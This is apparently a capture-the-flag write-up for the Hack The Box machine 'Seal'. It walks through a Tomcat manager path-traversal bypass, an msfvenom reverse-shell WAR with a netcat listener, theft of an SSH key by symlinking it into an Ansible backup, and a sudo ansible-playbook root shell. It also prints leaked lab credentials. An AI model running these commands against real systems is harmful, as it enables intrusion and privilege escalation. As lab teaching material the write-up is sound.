# Seal

## Remote Discovery
> Note: the box IP has been added to the `/etc/hosts` file as `seal.htb`

### Nmap Scan
An `nmap -Sc -Sv seal.htb` yields:
```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-19 12:58 EDT
Nmap scan report for seal.htb (10.10.10.250)
Host is up (0.100s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
...
443/tcp  open  ssl/http   nginx 1.18.0 (Ubuntu)
...
8080/tcp open  http-proxy
```

### GitBucket
Doing some exploring, we find a gitbucket page on `http://seal.htb:8080`, which is what the `8080 http-proxy` port is being used for. There doesn't seem to be any special requirments for creating a local account there... so we can create a user on their server. We'll use a username of `tester` and a password of `test`.

With this, we can view and download the entire code base for the server. One interesting find is on commit `ac210325afd2f6ae17cce84a8aa42805ce5fd010` we find some raw creds in `seal_market/tomcat/tomcat_users.xml`:
> Username: `tomcat`
>
> Password: `42MrHBf*z8{Z%`

We'll try to use these creds to get a foothold into their server. We've seen that `https://seal.htb/manager/html` gives us a `403 Forbidden`, but there is a sibling page `/manager/status` that was not blocked. On top of that, `Tomcat 9.0.31` has a path traversal vulnerability that allows us to get the the `/manager/html` page without being denied. We go to this url:
```
https://seal.htb/manager/status/..;/html
```

This explolits CVE-2020-1935 wherein an EOL char will screw up the interpretation of the url string. From here, we can access things like:
- Start, stop, reload, undeploy applications
- Deploy directory or WAR file located on server
- Re-read TLS configuration files
- Check to see if a web application has caused a memory leak on stop, reload or undeploy
- TLS connector configuration diagnostics

In the same way we can get to the manager, we can get to the host-manager similarly:
```
https://seal.htb/host-manager/text/..;/html
```

Here we can:
- Add Virtual Host
- List hosts
- Save current configuration (including virtual hosts) to server.xml and per web application context.xml files 

With this, we should be able to do some damage (insert picture of Phil Swift saying "thats a lot of damage")...


## Foothold

To get our foothold, we'll create a reverse shell WAR file using msfvenom:
```
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=$YOUR_IP LPORT=4242 -f war > reverse.war

$ strings reverse.war | grep jsp # in order to get the name of the file
```

Now we can start a `nc -lvnp 4242` listener on our machine, upload the war file, run it from the manager page, and get a basic shell.

Now we need to get access to _luis_, found in `/etc/passwd`. By looking around at things running, we find that ansible is running the playbook at `/opt/backups/playbook/run.yml` every 30 seconds. Looking into `run.yml` we find that we are making a backup of a directory in which we have write access.

Knowing this, we can make a symlink to `/home/luis/.ssh` in the backup. When the playbook backs this up, it will take the actual files. From here, we can copy the archived folder into the `/tmp/` directory, unpack it, and view the `id_rsa` file that contains luis' private ssh key! From here we can log into `luis@seal.htb` and get `user.txt`.

## Privesc

From here, we find that luis has sudo privs on ansible-playbook. With this, we can simply run this to get a root shell:
```
$ TF=$(mktemp)
$ echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF
$ sudo ansible-playbook $TF
...
# whoami
root
```
